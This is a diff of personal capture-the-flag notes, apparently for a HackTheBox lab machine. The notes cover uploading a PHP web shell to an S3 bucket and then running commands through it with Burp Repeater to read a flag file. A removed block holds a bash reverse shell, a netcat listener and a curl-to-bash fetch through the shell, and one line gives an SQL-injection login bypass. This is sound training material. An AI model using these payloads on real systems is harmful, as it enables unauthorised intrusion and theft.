@@ -33,19 +33,12 @@ PORT 80 - HTTP
                     echo '<?php system($_GET["cmd"]); ?>' > shell.php
                 then upload with aws using the following: 
                 aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
-            going to the site http://thetoppers.htb/shell.php?cmd=id we can see the upload worked and we can reverse shell in
-                create shell.php with the following:
-                    #!/bin/bash
-                    bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
-                start netcat listening on port 1337
-                    nc -nvlp 1337
-                start a python webserver on port 8000 to host the bash file
-                    python3 -m http.server 8000
-                execute the reverse shell with the following in the web browser:
-                    http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash
-                got stuck here
-                    bash: cannot set terminal process group (1561): Inappropriate ioctl for device
-                    bash: no job control in this shell
+            going to the site http://thetoppers.htb/shell.php?cmd=ls we can see shell.php and the upload worked
+            use burpsuite
+                navigate to site and in proxy/webhistory send to repeater
+                verify request by modifying line 1 GET /shell.php?cmd=ls    response should show shell.php listed
+                inject cmd commands with this line using ls to navigate to find target  example: GET /shell.php?cmd=ls+../
+                read files using cat command    example: GET /shell.php?cmd=cat+../flag.txt HTTP/1.1
 
     when a page has a login page can attempt SQL Injection using
         Username = admin'#
